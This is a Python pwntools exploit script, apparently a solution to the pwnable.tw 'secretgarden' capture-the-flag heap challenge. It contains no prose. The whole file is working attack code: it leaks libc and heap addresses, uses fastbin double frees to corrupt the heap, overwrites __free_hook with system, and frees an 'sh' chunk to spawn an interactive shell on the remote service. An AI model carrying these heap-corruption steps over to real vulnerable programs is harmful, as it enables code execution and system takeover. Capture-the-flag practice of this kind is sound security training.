from pwn import *

e = ELF("./secretgarden")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10203)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

nums = 0
def alloc(size=0x10, payload="AAAA", color="CCCC"):
  global nums  

  p.sendlineafter(":", "1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", payload + ("" if len(payload) == size else "\n"))
  p.sendafter(":", color + ("" if len(color) == 23 else "\n"))
  nums += 1
  return nums - 1

def free(idx):
  p.sendlineafter(":", "3")
  p.sendlineafter(":", str(idx))

def clean():
  global nums

  nums = 0 
  p.sendlineafter(":", "4")

def show():
  p.sendlineafter(":", "2")

A = alloc(0x80)
B = alloc(0x50)
free(A)

C = alloc(0x50, payload="A" * 8)

show()
p.recvuntil("A" * 8 + "\n")
libc_base = u64(("\x00" + p.recvline(keepends=False)).ljust(8, "\x00")) - 0x7ff50e9dbb00 + 0x00007ff50e618000
print("Libc Base: {:#x}".format(libc_base))

free(B)
free(C)

A = alloc(0x50, payload="")
show()

p.recvuntil("flower[{}] :".format(A))
p.recvline()
heap_base = u64(("\x00" + p.recvline(keepends=False)).ljust(8, "\x00")) - 0x56273ff78100 + 0x000056273ff77000
print("Heap Base: {:#x}".format(heap_base))

free(A)
clean()

for i in range(10):
  alloc(0x28)
for i in range(10):
  free(i)
clean()

print("Malloc Hook: {:#x}".format(libc_base + libc.symbols["__malloc_hook"]))
print("Free Hook: {:#x}".format(libc_base + libc.symbols["__free_hook"]))

A = alloc(0x38)
B = alloc(0x38)
C = alloc(0x100)
sh = alloc(0x10, payload="sh")
_ = alloc(0x100)

free(A)
free(B)
free(A)

A = alloc(0x38, payload=p64(heap_base - 0x562c02044000 + 0x562c02045520 - 0x18))
B = alloc(0x38, payload="A" * 0x30 + p64(0x40))
A_2 = alloc(0x38)

A = alloc(0x68)
B = alloc(0x68)

free(C)

alloc(0x38, payload=p64(0x111) + p64(0) + p64(libc_base + libc.symbols["__free_hook"] - 0x1d))
alloc(0x100)




free(A)
free(B)
free(A)

alloc(0x68, payload=p64(libc_base + libc.symbols["__free_hook"] - 0x10))
alloc(0x68)
alloc(0x68)
alloc(0x68, payload=p64(libc_base + libc.symbols["system"]))
free(sh)

p.clean()

p.interactive()
